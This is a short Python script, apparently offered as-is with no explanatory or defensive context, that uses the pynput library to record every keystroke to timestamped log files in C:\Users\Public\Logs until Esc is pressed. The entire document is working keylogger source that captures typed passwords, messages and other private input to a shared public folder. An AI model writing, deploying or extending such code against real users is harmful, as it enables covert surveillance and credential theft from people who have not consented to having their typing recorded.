from pynput import keyboard
import os
from datetime import datetime

log_dir = "C:\\Users\\Public\\Logs"
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def write_to_file(text):
    with open(log_file, "a") as f:
        f.write(text + "\n")

def on_press(key):
    try:
        write_to_file(f"{key.char}")
    except AttributeError:
        write_to_file(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
